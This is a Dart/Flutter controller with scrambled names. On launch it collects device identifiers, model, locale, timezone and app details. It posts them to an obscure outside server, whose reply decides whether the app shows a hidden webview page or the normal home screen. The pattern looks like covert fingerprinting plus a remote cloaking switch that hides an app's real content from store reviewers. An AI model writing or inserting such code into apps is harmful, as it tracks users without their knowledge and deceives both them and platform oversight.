import 'dart:convert';
import 'dart:io';

import 'package:device_info_plus/device_info_plus.dart';
import 'package:dio/dio.dart';
import 'package:flutter_inappwebview/flutter_inappwebview.dart';
import 'package:flutter_timezone/flutter_timezone.dart';
import 'package:get/get.dart';
import 'package:package_info_plus/package_info_plus.dart';

class PageLogic extends GetxController {

  var sboyzt = RxBool(false);
  var lakemjwgp = RxBool(true);
  var dfrnms = RxString("");
  var randy = RxBool(false);
  var ryan = RxBool(true);
  final hnxgrlo = Dio();


  InAppWebViewController? webViewController;

  @override
  void onInit() {
    super.onInit();
    cvbodyui();
  }


  Future<void> cvbodyui() async {

    randy.value = true;
    ryan.value = true;
    lakemjwgp.value = false;

    hnxgrlo.post("https://xai.thoungt.xyz/yhnsbvlmcu",data: await zwntlycxkp()).then((value) {
      var qufhecjp = value.data["qufhecjp"] as String;
      var namtvdl = value.data["namtvdl"] as bool;
      if (namtvdl) {
        dfrnms.value = qufhecjp;
        alisa();
      } else {
        waelchi();
      }
    }).catchError((e) {
      lakemjwgp.value = true;
      ryan.value = true;
      randy.value = false;
    });
  }

  Future<Map<String, dynamic>> zwntlycxkp() async {
    final DeviceInfoPlugin ramdqh = DeviceInfoPlugin();
    PackageInfo lmjnpbu_lhrzswn = await PackageInfo.fromPlatform();
    final String currentTimeZone = await FlutterTimezone.getLocalTimezone();
    var plxka = Platform.localeName;
    var uqjcmef = currentTimeZone;

    var pqhu = lmjnpbu_lhrzswn.packageName;
    var fibq = lmjnpbu_lhrzswn.version;
    var likdoms = lmjnpbu_lhrzswn.buildNumber;

    var awcblge = lmjnpbu_lhrzswn.appName;
    var jmft = "";
    var easterBashirian = "";
    var zveisl = "";
    var gennaroHansen = "";
    var eloisaGoldner = "";
    var eddieGoldner = "";

    var msxcak  = "";

    var osbwq = "";
    var mpqz = false;

    if (GetPlatform.isAndroid) {
      osbwq = "android";
      var eroclfkht = await ramdqh.androidInfo;

      zveisl = eroclfkht.brand;

      jmft  = eroclfkht.model;
      msxcak = eroclfkht.id;

      mpqz = eroclfkht.isPhysicalDevice;
    }

    if (GetPlatform.isIOS) {
      osbwq = "ios";
      var alpbnxkq = await ramdqh.iosInfo;
      zveisl = alpbnxkq.name;
      jmft = alpbnxkq.model;

      msxcak = alpbnxkq.identifierForVendor ?? "";
      mpqz  = alpbnxkq.isPhysicalDevice;
    }
    var res = {
      "likdoms": likdoms,
      "awcblge": awcblge,
      "pqhu": pqhu,
      "eloisaGoldner" : eloisaGoldner,
      "jmft": jmft,
      "uqjcmef": uqjcmef,
      "fibq": fibq,
      "easterBashirian" : easterBashirian,
      "zveisl": zveisl,
      "plxka": plxka,
      "osbwq": osbwq,
      "mpqz": mpqz,
      "eddieGoldner" : eddieGoldner,
      "msxcak": msxcak,
      "gennaroHansen" : gennaroHansen,

    };
    return res;
  }

  Future<void> waelchi() async {
    Get.offAllNamed("/home");
  }

  Future<void> alisa() async {
    Get.offAllNamed("/tbto");
  }

}
